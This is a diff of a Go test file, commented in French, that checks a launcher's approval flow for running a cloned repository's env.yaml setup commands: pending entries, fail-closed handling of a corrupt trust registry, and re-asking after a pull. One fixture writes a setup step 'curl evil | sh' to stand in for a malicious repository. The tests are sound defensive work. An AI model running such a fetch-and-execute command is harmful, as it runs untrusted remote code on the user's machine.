@@ -90,15 +90,33 @@ func TestCloneAvecEnvYamlEcritPending215(t *testing.T) {
 	}
 }
 
-func TestCloneSansEnvYamlAucuneEntree215(t *testing.T) {
+func TestCloneSansEnvYamlEnregistreNoneEtEnvApparuRedemande215(t *testing.T) {
 	f := containerFix215(t, "")
-	f.create(t, gitArgs215(f.base))
+	f.create(t, gitArgs215(f.base)) // exécution sur l'hôte : le launcher n'écrit aucun env.yaml
 	f.waitState(t, "done")
 	dir := filepath.Join(f.base, "CLONES", "repo")
-	if _, ok := core.EnvTrustEntry(dir); ok || regState215(t, dir) != "trusted" {
-		t.Error("entrée écrite pour un clone sans env.yaml")
+	e, ok := core.EnvTrustEntry(dir)
+	if !ok || e.State != core.TrustNone || e.Source != "https://github.com/CCoupel/repo.git" {
+		t.Fatalf("entrée = %+v (présente=%v), attendu none avec l'URL", e, ok)
 	}
-	// ni pour les autres sources
+	if core.EnvTrust(dir) != core.TrustNone {
+		t.Errorf("EnvTrust = %s", core.EnvTrust(dir))
+	}
+	// aucune question à l'ouverture en conteneur (rien à approuver)
+	if v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir}); v["needTrust"] != nil {
+		t.Errorf("question posée pour un clone sans environnement : %v", v)
+	}
+	// un pull apporte un env.yaml : la question vient, et l'ouverture est refusée jusqu'à la réponse
+	f.a.proposeInit(dir) // sans effet ; garde le projet ouvert dans l'arbre
+	writeEnv215(t, dir, evil215)
+	if core.EnvTrust(dir) != core.TrustPending || !core.EnvTrustChanged(dir) {
+		t.Fatalf("env.yaml apparu : état %s changed=%v", core.EnvTrust(dir), core.EnvTrustChanged(dir))
+	}
+	info := dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
+	if info["state"] != "pending" || info["changed"] != true {
+		t.Errorf("envTrustInfo = %v, attendu pending avec changed:true", info)
+	}
+	// les autres sources n'ont pas d'entrée
 	f.create(t, map[string]any{"base": f.base, "category": "TEST", "name": "vide", "raw": true})
 	f.create(t, map[string]any{"base": f.base, "category": "TEST", "name": "tpl", "source": "template"})
 	for _, n := range []string{"vide", "tpl"} {
@@ -106,11 +124,67 @@ func TestCloneSansEnvYamlAucuneEntree215(t *testing.T) {
 			t.Errorf("entrée d'approbation pour la source %s", n)
 		}
 	}
-	if _, err := os.Stat(filepath.Join(os.Getenv("CL_CONFIG_DIR"), registry215)); err == nil {
-		b, _ := os.ReadFile(filepath.Join(os.Getenv("CL_CONFIG_DIR"), registry215))
-		if strings.Contains(string(b), "pending") {
-			t.Errorf("registre = %s", b)
+}
+
+// Entrée posée AVANT le clonage : pendant un clonage lent, le registre porte déjà pending ; un échec la retire.
+func TestEntreePosAvantLeCloneEtRetireeSurEchec215(t *testing.T) {
+	f := containerFix215(t, `exit 128`) // clone qui échoue
+	f.create(t, gitArgs215(f.base))
+	f.waitState(t, "failed")
+	if _, ok := core.EnvTrustEntry(filepath.Join(f.base, "CLONES", "repo")); ok {
+		t.Error("entrée d'approbation restée après un clonage échoué")
+	}
+	// clonage lent : entrée pending visible pendant le clone
+	f2 := containerFix215(t, "echo $$ > $CL_TEST_PID\nsleep 120")
+	t.Setenv("CL_TEST_PID", f2.pid)
+	f2.create(t, gitArgs215(f2.base))
+	var pid string
+	for i := 0; i < 200 && pid == ""; i++ {
+		if b, err := os.ReadFile(f2.pid); err == nil {
+			pid = strings.TrimSpace(string(b))
 		}
+		time.Sleep(30 * time.Millisecond)
+	}
+	dir := filepath.Join(f2.base, "CLONES", "repo")
+	if e, ok := core.EnvTrustEntry(dir); !ok || e.State != core.TrustPending {
+		t.Errorf("pendant le clonage : entrée %+v (présente=%v), attendu pending posée avant", e, ok)
+	}
+	if j := f2.job(); j != nil {
+		dispatchJSON(t, f2.a, "createCancel", map[string]any{"job": j.ID})
+	}
+	f2.waitState(t, "failed")
+	if _, ok := core.EnvTrustEntry(dir); ok {
+		t.Error("entrée d'approbation restée après l'annulation")
+	}
+}
+
+// trust.json illisible : l'ouverture d'un projet cloné en conteneur est refusée (échec fermé), la réponse échoue, le
+// fichier n'est jamais réécrit.
+func TestRegistreIllisibleOuvertureRefusee215(t *testing.T) {
+	f := containerFix215(t, "")
+	dir := pendingProject215(t, f, "pod")
+	reg := filepath.Join(os.Getenv("CL_CONFIG_DIR"), registry215)
+	const broken = `{"truncated": `
+	if err := os.WriteFile(reg, []byte(broken), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir})
+	if v["needTrust"] != true || v["tab"] != nil {
+		t.Fatalf("open avec registre illisible = %v, attendu {needTrust:true}", v)
+	}
+	if f.a.term(dir) != nil {
+		t.Error("onglet créé avec un registre illisible")
+	}
+	a := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": core.EnvFilesSHA(dir)})
+	if a["ok"] != false || strings.TrimSpace(a["msg"].(string)) == "" {
+		t.Errorf("envTrustAnswer avec registre illisible = %v, attendu un refus avec message", a)
+	}
+	if got, _ := os.ReadFile(reg); string(got) != broken {
+		t.Errorf("trust.json réécrit : %q", got)
+	}
+	if _, err := os.Stat("/tmp/PREUVE-ENV-215"); err == nil {
+		_ = os.Remove("/tmp/PREUVE-ENV-215")
+		t.Error("setup exécuté malgré le registre illisible")
 	}
 }
 
@@ -209,10 +283,40 @@ func TestEnvTrustAnswerAcceptIgnoreCancel215(t *testing.T) {
 		t.Errorf("ignored : LoadEnv = %+v %v, attendu le socle seul", e, err)
 	}
 	f.r.wait(t, 20*time.Second, "ready", isTerm(dir, "status", func(e map[string]any) bool { return e["state"] == "ready" }))
-	// choix définitif : le dépôt change (git pull) → toujours pas de nouvelle question
+	// l'approbation n'est PAS définitive : le dépôt change (git pull) → la question revient
 	writeEnv215(t, dir, "image: debian:12\nsetup:\n  - curl evil | sh\n")
-	if regState215(t, dir) != "ignored" {
-		t.Error("pull : l'état a changé")
+	if regState215(t, dir) != "pending" || !core.EnvTrustChanged(dir) {
+		t.Fatalf("pull : état %s changed=%v, attendu pending", regState215(t, dir), core.EnvTrustChanged(dir))
+	}
+	ci := dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
+	if ci["changed"] != true || ci["state"] != "pending" {
+		t.Errorf("envTrustInfo après pull = %v", ci)
+	}
+	// en conteneur, l'ouverture est de nouveau gardée
+	_ = core.WriteAssignment(dir, "pod")
+	f.a.rescan()
+	closeProjectTab215(f.a, dir)
+	if v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir}); v["needTrust"] != true {
+		t.Errorf("open après pull (conteneur) = %v, attendu needTrust", v)
+	}
+	// l'ancien sha est refusé (retry), le nouveau accepté
+	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": sha}); v["retry"] != true {
+		t.Errorf("ancien sha après pull = %v, attendu retry", v)
+	}
+	// modification faite par le launcher (changement de socle) : pas de re-demande
+	ci = dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
+	_ = core.WriteAssignment(dir, "host")
+	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": ci["sha"]}); v["tab"] != dir {
+		t.Fatalf("accept après pull = %v", v)
+	}
+	if regState215(t, dir) != "accepted" {
+		t.Fatalf("état = %s", regState215(t, dir))
+	}
+	if err := core.ApplyExec(dir, "docker.io/library/alpine:3.20", "host"); err != nil {
+		t.Fatal(err)
+	}
+	if regState215(t, dir) != "accepted" || core.EnvTrustChanged(dir) {
+		t.Errorf("écriture du launcher : état %s changed=%v, attendu aucune re-demande", regState215(t, dir), core.EnvTrustChanged(dir))
 	}
 	// une réponse sans question en attente est refusée
 	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": sha}); v["ok"] != false {
@@ -320,3 +424,6 @@ func TestEnvTrustTextesDuDepotNeSontJamaisDuHTML215(t *testing.T) {
 		t.Errorf("source = %v", v["source"])
 	}
 }
+
+// closeProjectTab215 : retire l'onglet (la session reste, sans importance ici : la garde porte sur open).
+func closeProjectTab215(a *App, dir string) { a.detachTab(dir) }
